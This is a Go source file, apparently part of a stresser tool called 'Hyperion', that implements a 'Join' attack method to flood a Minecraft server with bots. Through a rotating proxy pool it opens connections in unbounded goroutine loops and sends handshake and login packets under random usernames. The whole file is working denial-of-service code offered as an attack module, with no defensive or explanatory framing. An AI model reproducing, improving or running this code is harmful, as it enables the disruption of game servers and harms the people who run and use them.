package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/utils"
)

type Join struct{}

var shouldRun = false

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start(info *core.AttackInfo, dialPool *proxy.DialPool) {
	shouldRun = true
	for shouldRun {
		for i := 0; i < info.Loops; i++ {
			go func() {
				for shouldRun {
					go connect(info, dialPool)
				}
			}()
		}
	}
}

func connect(info *core.AttackInfo, dialPool *proxy.DialPool) {
	conn, err := mc.DialMC(info.Ip, info.Port, dialPool.GetNext())
	if err != nil {
		return
	}
	mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
	mcutils.WriteLoginPacket(conn, utils.RandomName(16), false, nil)
}

func (join Join) Stop() {
	shouldRun = false
}
